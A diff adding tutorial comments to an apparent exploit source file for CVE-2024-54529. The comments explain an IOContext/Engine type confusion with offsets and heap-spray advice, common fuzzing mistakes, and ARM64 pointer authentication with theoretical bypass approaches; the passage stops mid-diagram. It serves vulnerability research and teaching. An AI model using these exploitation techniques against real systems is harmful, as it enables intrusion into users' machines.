+ * different field layouts at the confused offset. Analyzed pairs:
+ *
+ *   ┌───────────────┬───────────────┬─────────────────────────────────────────┐
+ *   │ Type A        │ Type B        │ Confusion Potential                     │
+ *   ├───────────────┼───────────────┼─────────────────────────────────────────┤
+ *   │ IOContext     │ Engine        │ HIGH - size overlap, offset 0x68        │
+ *   │ (0x120 bytes) │ (0x480 bytes) │ differs. Engine's 0x68 is controllable. │
+ *   ├───────────────┼───────────────┼─────────────────────────────────────────┤
+ *   │ Stream        │ Control       │ MEDIUM - similar sizes (~0x180).        │
+ *   │ (0x180 bytes) │ (0x160 bytes) │ Different vtables, some offset overlap. │
+ *   ├───────────────┼───────────────┼─────────────────────────────────────────┤
+ *   │ Device        │ PlugIn        │ LOW - significant size difference.      │
+ *   │ (0x400 bytes) │ (0x200 bytes) │ Less likely to allocate adjacently.     │
+ *   ├───────────────┼───────────────┼─────────────────────────────────────────┤
+ *   │ Tap           │ Engine        │ HIGH - Tap created via same handler.    │
+ *   │ (0x100 bytes) │ (0x480 bytes) │ 'mktp' selector confusion documented.   │
+ *   ├───────────────┼───────────────┼─────────────────────────────────────────┤
+ *   │ Client        │ System        │ NONE - System is singleton, Client      │
+ *   │               │               │ created per-connection. No overlap.     │
+ *   └───────────────┴───────────────┴─────────────────────────────────────────┘
+ *
+ * WHY IOContext/Engine IS THE VULNERABILITY:
+ *
+ *   1. Both types can be created by an unprivileged client
+ *   2. Engine objects are larger (1152 bytes) - easier to spray same size
+ *   3. The XIOContext_Fetch_Workgroup_Port handler:
+ *      - Looks up object by ID from global ObjectMap
+ *      - DOES NOT check if object->type == 'ioct'
+ *      - Directly dereferences obj+0x68 expecting workgroup_ptr
+ *   4. When Engine is passed instead:
+ *      - obj+0x68 in Engine contains different data
+ *      - This data may be uninitialized (from freed heap spray allocation)
+ *      - Attacker controls what was in that memory → controlled pointer
+ *      - Handler dereferences controlled pointer → arbitrary read/write or RCE
+ *
+ * DETECTION VIA TYPE MARKER:
+ *
+ *   To identify object type at runtime (for debugging/detection):
+ *
+ *   (lldb) x/1wx $x0+0x18
+ *   0x143a08c18: 0x74636f69        # 'ioct' = IOContext (safe)
+ *
+ *   (lldb) x/1wx $x0+0x18
+ *   0x143b12418: 0x656e676e        # 'ngne' = Engine (DANGER - type confusion!)
  *
  * ═══════════════════════════════════════════════════════════════════════════
  * 5.2.1 DETAILED MEMORY LAYOUTS (REVERSE ENGINEERED)
@@ -11503,6 +12966,15 @@ int main(int argc, char *argv[]) {
  * PART 6: BUG HUNTING METHODOLOGY CASE STUDY
  * =============================================================================
  * =============================================================================
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ AUDIENCE: Intermediate                                                  │
+ * │ PREREQUISITES: Programming, basic fuzzing concepts                      │
+ * │ LEARNING OBJECTIVES:                                                    │
+ * │   • Knowledge-driven fuzzing                                            │
+ * │   • Coverage analysis                                                   │
+ * │   • Crash triage                                                        │
+ * └─────────────────────────────────────────────────────────────────────────┘
  *
  * This section documents how CVE-2024-54529 was discovered, providing a
  * template for finding similar vulnerabilities in other services.
@@ -12217,6 +13689,34 @@ int main(int argc, char *argv[]) {
  *   • Race required: Reduces reliability significantly
  *
  * CVE-2024-54529 = DIRECT + DETERMINISTIC + CONTROLLABLE = IDEAL
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * COMMON TYPE CONFUSION MISTAKES
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * MISTAKE 1: ASSUMING RUNTIME TYPE CHECKS
+ * ───────────────────────────────────────
+ *   Problem: Expecting C/C++ to enforce types at runtime
+ *   Reality: The compiler trusts your casts completely
+ *   Lesson: Type safety is compile-time only in C/C++
+ *
+ * MISTAKE 2: IGNORING STRUCT PADDING
+ * ──────────────────────────────────
+ *   Problem: Assuming fields are packed contiguously
+ *   Reality: Compiler adds padding for alignment
+ *   Fix: Use sizeof() and offsetof() to verify layout
+ *
+ * MISTAKE 3: FORGETTING UNINITIALIZED MEMORY
+ * ──────────────────────────────────────────
+ *   Problem: Assuming constructors zero all fields
+ *   Reality: C++ only initializes what you tell it to
+ *   Exploit: Uninitialized fields contain previous heap data!
+ *
+ * MISTAKE 4: OBJECT SIZE MISMATCH
+ * ───────────────────────────────
+ *   Problem: Confusing objects of different sizes
+ *   Result: Reading past end of smaller object
+ *   Better: Target objects of SAME size for cleaner confusion
  *
  * ═══════════════════════════════════════════════════════════════════════════
  *
@@ -13035,6 +14535,40 @@ int main(int argc, char *argv[]) {
  * Reference: "Breaking the Sound Barrier Part I"
  *   https://projectzero.google/2025/05/breaking-sound-barrier-part-i-fuzzing.html
  *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * COMMON FUZZING MISTAKES
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * MISTAKE 1: NOT INITIALIZING STATE
+ * ─────────────────────────────────
+ *   Problem: State from previous iteration affects current one
+ *   Result: Non-reproducible crashes, false positives
+ *   Fix: Reset all state between iterations or use fork server
+ *
+ * MISTAKE 2: WRONG MESSAGE SEQUENCES
+ * ──────────────────────────────────
+ *   Problem: Sending messages in invalid order
+ *   Result: Early rejection, no coverage of interesting code
+ *   Fix: Learn the protocol, establish valid sessions first
+ *
+ * MISTAKE 3: SKIPPING SANITIZERS
+ * ──────────────────────────────
+ *   Problem: Not using MallocScribble, ASan, etc.
+ *   Result: Missing bugs that don't cause immediate crashes
+ *   Fix: Always fuzz with sanitizers enabled for detection
+ *
+ * MISTAKE 4: IGNORING COVERAGE
+ * ────────────────────────────
+ *   Problem: Blind fuzzing without feedback
+ *   Result: Hitting same code paths repeatedly
+ *   Fix: Use coverage-guided fuzzing, track new edges
+ *
+ * MISTAKE 5: POOR CORPUS MANAGEMENT
+ * ─────────────────────────────────
+ *   Problem: Corpus grows unbounded with redundant inputs
+ *   Result: Slow iteration, wasted resources
+ *   Fix: Minimize corpus, remove duplicates, prune regularly
+ *
  * -----------------------------------------------------------------------------
  * 6.5 FROM CRASH TO EXPLOITABLE: THE ANALYSIS PROCESS
  * -----------------------------------------------------------------------------
@@ -13142,6 +14676,15 @@ int main(int argc, char *argv[]) {
  * PART 7: DEFENSIVE LESSONS AND PATCHING
  * =============================================================================
  * =============================================================================
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ AUDIENCE: All Levels (layered)                                          │
+ * │ PREREQUISITES: None for overview, security for details                  │
+ * │ LEARNING OBJECTIVES:                                                    │
+ * │   • Apple's fix                                                         │
+ * │   • Variant analysis                                                    │
+ * │   • Detection strategies                                                │
+ * └─────────────────────────────────────────────────────────────────────────┘
  *
  * The final part of our case study: what can we learn to build better systems?
  *
@@ -16813,9 +18356,1208 @@ int main(int argc, char *argv[]) {
  *
  * =============================================================================
  * =============================================================================
+ * PART 16: ARM64 EXPLOITATION AND POINTER AUTHENTICATION (PAC)
+ * =============================================================================
+ * =============================================================================
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ AUDIENCE: Advanced → Expert                                             │
+ * │ PREREQUISITES: ARM64 assembly basics, understanding of x86 exploit      │
+ * │ LEARNING OBJECTIVES:                                                    │
+ * │   • Understand how PAC works at hardware level                          │
+ * │   • Know the different PAC key types and their uses                     │
+ * │   • Learn theoretical PAC bypass approaches                             │
+ * │   • See why CVE-2024-54529 is harder to exploit on ARM64                │
+ * │   • Understand the current state of PAC security research               │
+ * └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * Throughout this document, we've focused on the x86-64 exploitation path for
+ * CVE-2024-54529. But here's the elephant in the room: Apple has been shipping
+ * ARM64 Macs since late 2020. Every Mac sold since the M1 launch uses Apple
+ * Silicon, and these chips have a hardware security feature that fundamentally
+ * changes the exploitation landscape: Pointer Authentication Codes (PAC).
+ *
+ * This section explores PAC in depth—not to help attackers bypass it, but
+ * because understanding defensive mechanisms is essential for both offense
+ * and defense. If you're building secure systems, you need to understand what
+ * PAC does and doesn't protect. If you're evaluating bug severity, you need
+ * to know whether a vulnerability is exploitable on modern hardware.
+ *
+ * Let's dive in.
+ *
+ * =============================================================================
+ * 16.1 PAC FUNDAMENTALS: HARDWARE-LEVEL IMPLEMENTATION
+ * =============================================================================
+ *
+ * Pointer Authentication is a hardware feature introduced in ARMv8.3-A and
+ * implemented in all Apple Silicon chips (M1, M2, M3, M4, A12+). It's not a
+ * software mitigation that can be disabled—it's baked into the CPU itself.
+ *
+ * THE CORE IDEA:
+ * ──────────────
+ *
+ * Every pointer in memory is just a 64-bit value. Traditionally, if an attacker
+ * can overwrite a pointer, they control where execution goes. PAC changes this
+ * by SIGNING pointers with a cryptographic signature.
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │              TRADITIONAL POINTER vs PAC-SIGNED POINTER                  │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   TRADITIONAL 64-BIT POINTER (x86-64, older ARM):                       │
+ *   │   ┌────────────────────────────────────────────────────────────────┐    │
+ *   │   │                      64-bit Virtual Address                    │    │
+ *   │   │  [63                                                        0] │    │
+ *   │   │   0x00007FFFFFFFE000                                           │    │
+ *   │   └────────────────────────────────────────────────────────────────┘    │
+ *   │                                                                         │
+ *   │   Attacker overwrites pointer → Attacker controls execution             │
+ *   │                                                                         │
+ *   │   ─────────────────────────────────────────────────────────────────     │
+ *   │                                                                         │
+ *   │   PAC-SIGNED POINTER (ARM64e):                                          │
+ *   │   ┌────────────────────────────────────────────────────────────────┐    │
+ *   │   │ PAC Signature │ Extension │      Virtual Address               │    │
+ *   │   │  [63      55] │ [54   48] │ [47                            0]  │    │
+ *   │   │    0xAB       │    0x00   │  0x7FFFFFFFE000                    │    │
+ *   │   └────────────────────────────────────────────────────────────────┘    │
+ *   │                                                                         │
+ *   │   Attacker overwrites pointer → Signature mismatch → CRASH             │
+ *   │                                                                         │
+ *   │   The PAC field uses bits that would otherwise be unused (because      │
+ *   │   virtual addresses don't need all 64 bits on current hardware).       │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * HOW PAC SIGNATURES ARE COMPUTED:
+ * ─────────────────────────────────
+ *
+ * The PAC signature is computed using three inputs:
+ *
+ *   1. The POINTER VALUE itself (the address being protected)
+ *   2. A SECRET KEY (stored in system registers, not accessible to software)
+ *   3. A CONTEXT MODIFIER (additional data that must match during verification)
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │                    PAC SIGNATURE COMPUTATION                            │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │                    ┌─────────────┐                                      │
+ *   │                    │  SECRET KEY │  (128-bit, per-process)              │
+ *   │                    │  (APIAKey,  │                                      │
+ *   │                    │   APIBKey,  │                                      │
+ *   │                    │   APDAKey,  │                                      │
+ *   │                    │   APDBKey)  │                                      │
+ *   │                    └──────┬──────┘                                      │
+ *   │                           │                                             │
+ *   │   ┌───────────────┐       │       ┌───────────────┐                     │
+ *   │   │   POINTER     │       │       │   CONTEXT     │                     │
+ *   │   │ (64-bit addr) │       │       │ (SP, 0, or    │                     │
+ *   │   │               │───────┼───────│  custom 64b)  │                     │
+ *   │   └───────────────┘       │       └───────────────┘                     │
+ *   │                           ▼                                             │
+ *   │              ┌────────────────────────┐                                 │
+ *   │              │    QARMA CIPHER        │  (or IMPLEMENTATION-DEFINED)    │
+ *   │              │  (tweakable block      │                                 │
+ *   │              │   cipher, fast!)       │                                 │
+ *   │              └───────────┬────────────┘                                 │
+ *   │                          │                                              │
+ *   │                          ▼                                              │
+ *   │              ┌────────────────────────┐                                 │
+ *   │              │   PAC SIGNATURE        │                                 │
+ *   │              │   (upper bits of ptr)  │                                 │
+ *   │              └────────────────────────┘                                 │
+ *   │                                                                         │
+ *   │   The cipher is designed to be FAST (single-cycle on Apple Silicon)    │
+ *   │   while being cryptographically strong enough to resist forgery.       │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * THE PAC INSTRUCTION SET:
+ * ────────────────────────
+ *
+ * ARM64 provides dedicated instructions for PAC operations:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │                    PAC INSTRUCTIONS                                     │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   SIGNING INSTRUCTIONS (Add PAC to pointer):                            │
+ *   │   ─────────────────────────────────────────                             │
+ *   │   PACIA  Xd, Xn   ; Sign Xd with A-key, context in Xn                   │
+ *   │   PACIB  Xd, Xn   ; Sign Xd with B-key, context in Xn                   │
+ *   │   PACDA  Xd, Xn   ; Sign data ptr Xd with A-key, context Xn             │
+ *   │   PACDB  Xd, Xn   ; Sign data ptr Xd with B-key, context Xn             │
+ *   │                                                                         │
+ *   │   PACIZA Xd       ; Sign Xd with A-key, context = 0                     │
+ *   │   PACIZB Xd       ; Sign Xd with B-key, context = 0                     │
+ *   │   PACDZA Xd       ; Sign data ptr with A-key, context = 0               │
+ *   │   PACDZB Xd       ; Sign data ptr with B-key, context = 0               │
+ *   │                                                                         │
+ *   │   PACIASP         ; Sign LR with A-key, context = SP (common!)          │
+ *   │   PACIBSP         ; Sign LR with B-key, context = SP (most common!)     │
+ *   │                                                                         │
+ *   │   AUTHENTICATION INSTRUCTIONS (Verify and strip PAC):                   │
+ *   │   ───────────────────────────────────────────────────                   │
+ *   │   AUTIA  Xd, Xn   ; Authenticate Xd with A-key, context Xn              │
+ *   │   AUTIB  Xd, Xn   ; Authenticate Xd with B-key, context Xn              │
+ *   │   AUTDA  Xd, Xn   ; Authenticate data ptr with A-key                    │
+ *   │   AUTDB  Xd, Xn   ; Authenticate data ptr with B-key                    │
+ *   │                                                                         │
+ *   │   AUTIZA Xd       ; Authenticate with A-key, context = 0                │
+ *   │   AUTIZB Xd       ; Authenticate with B-key, context = 0                │
+ *   │   AUTDZA Xd       ; Authenticate data ptr, A-key, context = 0           │
+ *   │   AUTDZB Xd       ; Authenticate data ptr, B-key, context = 0           │
+ *   │                                                                         │
+ *   │   AUTIASP         ; Authenticate LR with A-key, context = SP            │
+ *   │   AUTIBSP         ; Authenticate LR with B-key, context = SP            │
+ *   │                                                                         │
+ *   │   COMBINED INSTRUCTIONS:                                                │
+ *   │   ─────────────────────                                                 │
+ *   │   RETAA           ; Authenticate LR (A-key), then RET                   │
+ *   │   RETAB           ; Authenticate LR (B-key), then RET (most common!)    │
+ *   │   BRAA Xn, Xm     ; Authenticate Xn (A-key, context Xm), then BR        │
+ *   │   BRAB Xn, Xm     ; Authenticate Xn (B-key, context Xm), then BR        │
+ *   │   BLRAA Xn, Xm    ; Authenticate, then BLR                              │
+ *   │   BLRAB Xn, Xm    ; Authenticate, then BLR                              │
+ *   │                                                                         │
+ *   │   XPACI Xd        ; Strip PAC from Xd (Instruction pointer)             │
+ *   │   XPACD Xd        ; Strip PAC from Xd (Data pointer)                    │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * WHEN PAC CHECKS HAPPEN:
+ * ───────────────────────
+ *
+ * PAC authentication is performed by AUT* instructions or combined instructions
+ * like RETAB. If authentication FAILS:
+ *
+ *   1. The pointer's upper bits are CORRUPTED (flipped to invalid values)
+ *   2. Any subsequent use of the pointer will cause a fault
+ *   3. On macOS/iOS, this results in a SIGBUS or SIGSEGV → crash
+ *
+ * The key insight: PAC doesn't prevent the overwrite—it makes the overwritten
+ * pointer USELESS. The attacker can change the pointer, but they can't forge
+ * a valid signature without knowing the secret key.
+ *
+ * =============================================================================
+ * 16.2 PAC KEY TYPES: A KEYS VS B KEYS
+ * =============================================================================
+ *
+ * PAC provides FIVE different keys, each with a specific purpose:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │                    PAC KEY TYPES                                        │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   KEY NAME    TYPE          PRIMARY USE                                 │
+ *   │   ────────    ────          ───────────                                 │
+ *   │   APIAKey     Instruction   Return addresses (via PACIASP)              │
+ *   │   APIBKey     Instruction   Function pointers, JIT (via PACIBSP)        │
+ *   │   APDAKey     Data          General data pointers                       │
+ *   │   APDBKey     Data          Reserved / special data pointers            │
+ *   │   APGAKey     Generic       Generic authentication (PACGA)              │
+ *   │                                                                         │
+ *   │   "A" vs "B" keys exist to SEPARATE different pointer types.            │
+ *   │   A pointer signed with the A-key cannot be validated with B-key.       │
+ *   │   This prevents cross-type pointer substitution attacks.                │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * IA KEY (Instruction A) - APIAKey:
+ * ─────────────────────────────────
+ *
+ * This is the MOST IMPORTANT key for security. It protects RETURN ADDRESSES.
+ *
+ * When a function is entered, the compiler emits:
+ *
+ *     PACIBSP          ; Sign the return address (LR) with SP as context
+ *
+ * When the function returns:
+ *
+ *     RETAB            ; Authenticate LR (with SP context), then return
+ *
+ * If an attacker overwrites the return address on the stack, RETAB will fail
+ * because the signature won't match. This BREAKS traditional ROP attacks.
+ *
+ * IB KEY (Instruction B) - APIBKey:
+ * ─────────────────────────────────
+ *
+ * Used for function pointers—addresses that will be called via indirect branch.
+ * In Objective-C, this includes:
+ *   - IMP (method implementations)
+ *   - Block invoke pointers
+ *   - C function pointers passed to callbacks
+ *
+ * DA KEY (Data A) - APDAKey:
+ * ──────────────────────────
+ *
+ * Used for general data pointers. On iOS/macOS, this includes:
+ *   - Objective-C isa pointers (the class pointer in every object)
+ *   - Some vtable pointers
+ *   - Security-critical data structures
+ *
+ * DB KEY (Data B) - APDBKey:
+ * ──────────────────────────
+ *
+ * Typically reserved. Apple uses different keys for different security
+ * contexts to prevent key reuse attacks.
+ *
+ * KEY STORAGE AND MANAGEMENT:
+ * ───────────────────────────
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │                    PAC KEY ARCHITECTURE                                 │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   Keys are stored in SYSTEM REGISTERS, not accessible to user code:    │
+ *   │                                                                         │
+ *   │   ┌────────────────────────────────────────────────────────────────┐    │
+ *   │   │                                                                │    │
+ *   │   │    APIAKeyLo / APIAKeyHi  (128-bit key, EL0 not readable)     │    │
+ *   │   │    APIBKeyLo / APIBKeyHi                                       │    │
+ *   │   │    APDAKeyLo / APDAKeyHi                                       │    │
+ *   │   │    APDBKeyLo / APDBKeyHi                                       │    │
+ *   │   │    APGAKeyLo / APGAKeyHi                                       │    │
+ *   │   │                                                                │    │
+ *   │   │    These registers are:                                        │    │
+ *   │   │    - Set by the kernel during process creation                 │    │
+ *   │   │    - Different for EACH PROCESS (not system-wide)              │    │
+ *   │   │    - Protected by EL1 privilege (kernel only)                  │    │
+ *   │   │    - On Apple Silicon: backed by Secure Enclave entropy        │    │
+ *   │   │                                                                │    │
+ *   │   └────────────────────────────────────────────────────────────────┘    │
+ *   │                                                                         │
+ *   │   Per-process keys mean:                                                │
+ *   │   - A leaked signature from Process A is USELESS in Process B          │
+ *   │   - Even if attacker runs their own process, they learn nothing        │
+ *   │   - Fork preserves keys (child has same keys as parent)                │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * CONTEXT MODIFIERS:
+ * ──────────────────
+ *
+ * The CONTEXT is crucial—it's an additional 64-bit value mixed into the
+ * signature. Common contexts:
+ *
+ *   SP (Stack Pointer):
+ *     PACIBSP uses SP as context. This means the signature is tied to the
+ *     EXACT stack location. Move the return address to a different stack
+ *     location, and the signature becomes invalid.
+ *
+ *   Zero:
+ *     PACIZB uses 0 as context. The signature depends only on the pointer
+ *     and key. Useful for global function pointers that don't have a
+ *     natural context.
+ *
+ *   Custom:
+ *     PACIB Xd, Xn uses Xn as context. This allows binding a pointer to
+ *     arbitrary context data (e.g., an object's address).
+ *
+ * =============================================================================
+ * 16.3 WHAT GETS SIGNED ON macOS/iOS
+ * =============================================================================
+ *
+ * Not everything is PAC-protected. Understanding what IS and ISN'T signed
+ * is crucial for exploitation analysis.
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │                    PAC PROTECTION COVERAGE                              │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   ╔═══════════════════════════════════════════════════════════════════╗ │
+ *   │   ║  WHAT IS SIGNED (Protected by PAC)                                ║ │
+ *   │   ╠═══════════════════════════════════════════════════════════════════╣ │
+ *   │   ║                                                                   ║ │
+ *   │   ║  ✓ Return addresses (PACIBSP on entry, RETAB on exit)             ║ │
+ *   │   ║  ✓ Most Objective-C method implementations (IMP)                  ║ │
+ *   │   ║  ✓ C++ vtable pointers (when compiler enables it)                 ║ │
+ *   │   ║  ✓ Block invoke pointers                                          ║ │
+ *   │   ║  ✓ Kernel function pointers (aggressive PAC usage)                ║ │
+ *   │   ║  ✓ isa pointers in Objective-C objects (AUTDA protected)          ║ │
+ *   │   ║  ✓ Some CoreFoundation internal pointers                          ║ │
+ *   │   ║  ✓ JIT code entry points (in JavaScriptCore)                      ║ │
+ *   │   ║                                                                   ║ │
+ *   │   ╚═══════════════════════════════════════════════════════════════════╝ │
+ *   │                                                                         │
+ *   │   ╔═══════════════════════════════════════════════════════════════════╗ │
+ *   │   ║  WHAT IS NOT SIGNED (Potential attack surface)                    ║ │
+ *   │   ╠═══════════════════════════════════════════════════════════════════╣ │
+ *   │   ║                                                                   ║ │
+ *   │   ║  ✗ Regular data pointers (char*, struct foo*, etc.)               ║ │
+ *   │   ║  ✗ Array indices and lengths                                      ║ │
+ *   │   ║  ✗ File descriptors, port names, handles                          ║ │
+ *   │   ║  ✗ String contents                                                ║ │
+ *   │   ║  ✗ Numeric values used in calculations                            ║ │
+ *   │   ║  ✗ Some legacy C function pointers (if not recompiled)            ║ │
+ *   │   ║  ✗ Pointers in third-party libraries (depends on compilation)     ║ │
+ *   │   ║  ✗ JIT-generated code CONTENTS (only entry is signed)             ║ │
+ *   │   ║                                                                   ║ │
+ *   │   ╚═══════════════════════════════════════════════════════════════════╝ │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * RETURN ADDRESS PROTECTION IN DETAIL:
+ * ────────────────────────────────────
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │          ARM64 FUNCTION WITH PAC (PROLOGUE / EPILOGUE)                  │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   _vulnerable_function:                                                 │
+ *   │                                                                         │
+ *   │   ; === PROLOGUE ===                                                    │
+ *   │       pacibsp                 ; Sign LR: LR = PAC(LR, SP, IB-key)       │
+ *   │       stp x29, x30, [sp, #-16]!  ; Save FP and signed LR to stack      │
+ *   │       mov x29, sp             ; Set up frame pointer                    │
+ *   │                                                                         │
+ *   │   ; === FUNCTION BODY ===                                               │
+ *   │       ; ... potentially vulnerable code ...                             │
+ *   │       ; ... attacker might overwrite stack here ...                     │
+ *   │                                                                         │
+ *   │   ; === EPILOGUE ===                                                    │
+ *   │       ldp x29, x30, [sp], #16 ; Load FP and (potentially corrupted) LR │
+ *   │       retab                   ; Authenticate LR, then return            │
+ *   │                               ; If auth fails → LR corrupted → crash!  │
+ *   │                                                                         │
+ *   │   What happens if attacker overwrites LR on stack:                      │
+ *   │                                                                         │
+ *   │   1. ldp loads attacker's fake return address into X30                  │
+ *   │   2. retab tries to authenticate X30 with current SP                    │
+ *   │   3. Authentication FAILS (signature doesn't match)                     │
+ *   │   4. X30 upper bits flipped to invalid values                           │
+ *   │   5. Branch to corrupted address → FAULT → crash                        │
+ *   │                                                                         │
+ *   │   Result: ROP chain is BROKEN. Can't hijack control flow.               │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * VTABLE POINTER PROTECTION:
+ * ──────────────────────────
+ *
+ * C++ virtual function calls go through vtables. On PAC-enabled systems:
+ *
+ *   WITHOUT PAC:
+ *     Object → vtable_ptr → [func1, func2, func3, ...]
+ *     Attacker corrupts vtable_ptr → points to fake vtable → code execution
+ *
+ *   WITH PAC:
+ *     Object → SIGNED(vtable_ptr) → [SIGNED(func1), SIGNED(func2), ...]
+ *     Attacker corrupts vtable_ptr → authentication fails → crash
+ *
+ * However, PAC protection for vtables is SELECTIVE:
+ *   - Apple's system libraries: heavily protected
+ *   - Third-party code: depends on compiler flags (-fptrauth-* options)
+ *   - JIT-compiled code: may have weaker protection
+ *
+ * =============================================================================
+ * 16.4 THEORETICAL BYPASS APPROACHES
+ * =============================================================================
+ *
+ * PAC is strong, but not perfect. Here are the theoretical approaches
+ * researchers have explored. Understanding these helps evaluate the
+ * real-world exploitability of vulnerabilities on ARM64.
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * BYPASS 1: SIGNING GADGETS
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * A "signing gadget" is existing code that:
+ *   1. Takes an attacker-controlled value
+ *   2. Signs it with a PAC key
+ *   3. Stores or returns the signed pointer
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │                    SIGNING GADGET CONCEPT                               │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   Imagine this (hypothetical) vulnerable code:                          │
+ *   │                                                                         │
+ *   │   void set_callback(void *callback_addr) {                              │
+ *   │       // Developer wants to store a signed function pointer             │
+ *   │       // But accidentally signs attacker-controlled input!              │
+ *   │                                                                         │
+ *   │       global_callback = ptrauth_sign_unauthenticated(                   │
+ *   │           callback_addr,                                                │
+ *   │           ptrauth_key_function_pointer,                                 │
+ *   │           0  // context                                                 │
+ *   │       );                                                                │
+ *   │   }                                                                     │
+ *   │                                                                         │
+ *   │   If attacker can call set_callback(arbitrary_address):                 │
+ *   │   → They get a validly-signed pointer to ANY address                    │
+ *   │   → This bypasses PAC for that pointer type                             │
+ *   │                                                                         │
+ *   │   WHY THESE ARE RARE:                                                   │
+ *   │   - Code review catches obvious cases                                   │
+ *   │   - ptrauth_sign_* is only used in specific contexts                    │
+ *   │   - Most signing happens automatically (PACIBSP at function entry)      │
+ *   │                                                                         │
+ *   │   WHERE TO LOOK:                                                        │
+ *   │   - Serialization/deserialization code                                  │
+ *   │   - JIT compilers (they must sign generated code)                       │
+ *   │   - Plugin loading systems                                              │
+ *   │   - Callback registration APIs                                          │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * BYPASS 2: PAC ORACLES
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * A PAC oracle is an information leak that reveals valid signatures.
+ * If you can observe signed pointers, you might be able to REUSE them.
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │                    PAC ORACLE CONCEPT                                   │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   SIGNATURE LEAK:                                                       │
+ *   │   ────────────────                                                      │
+ *   │   If attacker can read memory containing a signed pointer:              │
+ *   │                                                                         │
+ *   │   signed_ptr = [PAC bits | address bits]                                │
+ *   │                                                                         │
+ *   │   They learn the PAC signature for THAT specific pointer.               │
+ *   │   Can they reuse it?                                                    │
+ *   │                                                                         │
+ *   │   REUSE CONSTRAINTS:                                                    │
+ *   │   ───────────────────                                                   │
+ *   │   The signature is tied to:                                             │
+ *   │     • The exact pointer value (address)                                 │
+ *   │     • The context used when signing                                     │
+ *   │     • The key type (IA, IB, DA, DB)                                     │
+ *   │                                                                         │
+ *   │   To reuse a leaked signature, ALL THREE must match!                    │
+ *   │                                                                         │
+ *   │   PRACTICAL SCENARIO:                                                   │
+ *   │   ────────────────────                                                  │
+ *   │   1. Leak signed pointer to function X at address 0x1000                │
+ *   │   2. Pointer was signed with context = 0                                │
+ *   │   3. Attacker can substitute this pointer where:                        │
+ *   │      - A pointer to 0x1000 is expected                                  │
+ *   │      - Context 0 is used for verification                               │
+ *   │      - Same key type (IB for functions)                                 │
+ *   │                                                                         │
+ *   │   This is useful but LIMITED:                                           │
+ *   │   - Can only call functions at addresses you've leaked                  │
+ *   │   - Context must match (SP-based contexts are position-dependent)       │
+ *   │   - Still constrains the attack significantly                           │
+ *   │                                                                         │
+ *   │   TIMING ORACLES:                                                       │
+ *   │   ───────────────                                                       │
+ *   │   Some research has explored timing differences:                        │
+ *   │   - Does authentication success/failure take different time?            │
+ *   │   - Can cache state reveal information about PAC computation?           │
+ *   │                                                                         │
+ *   │   Apple Silicon has MITIGATIONS against timing attacks:                 │
+ *   │   - Constant-time PAC computation                                       │
+ *   │   - Authentication failure doesn't early-exit                           │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * BYPASS 3: CONTEXT CONFUSION
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * PAC signatures include a CONTEXT value. If the context is predictable
+ * or controllable, it weakens the protection.
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │                    CONTEXT CONFUSION ATTACK                             │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   SP-BASED CONTEXT:                                                     │
+ *   │   ──────────────────                                                    │
+ *   │   PACIBSP signs the return address with SP as context.                  │
+ *   │   At function return, RETAB verifies with CURRENT SP.                   │
+ *   │                                                                         │
+ *   │   Normal case:                                                          │
+ *   │     Entry:  SP = 0x7fff1000, LR = 0x12345678                            │
+ *   │     Sign:   signed_LR = PAC(LR, SP=0x7fff1000, key)                     │
+ *   │     Return: SP = 0x7fff1000 (same!)                                     │
+ *   │     Auth:   PAC(signed_LR, SP=0x7fff1000, key) → SUCCESS                │
